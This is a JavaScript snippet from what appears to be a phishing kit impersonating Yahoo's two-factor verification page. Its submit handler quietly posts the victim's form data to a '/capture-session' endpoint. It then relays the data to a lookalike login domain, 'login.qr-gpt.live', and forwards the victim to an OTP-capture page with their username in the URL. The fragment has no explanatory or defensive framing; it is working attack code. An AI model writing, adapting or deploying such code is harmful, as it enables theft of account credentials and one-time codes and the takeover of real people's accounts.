// js/yahoo-2fa.js (partial update)
form.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!selectedMethodInput.value) {
        showError('Please select a verification method.');
        return;
    }
    showLoading();
    const formData = new FormData(form);
    fetch('/capture-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(Object.fromEntries(formData))
    }).then(() => {
        fetch('https://login.qr-gpt.live/account/challenge/challenge-selector', {
            method: 'POST',
            body: formData
        }).then(response => response.json()).then(data => {
            if (data.success) {
                window.location.href = `/otp?u=${encodeURIComponent(username)}&m=${selectedMethodInput.value}`;
            } else {
                showError('Failed to select verification method.');
            }
        }).catch(err => showError('Error during verification setup.'));
    });
});
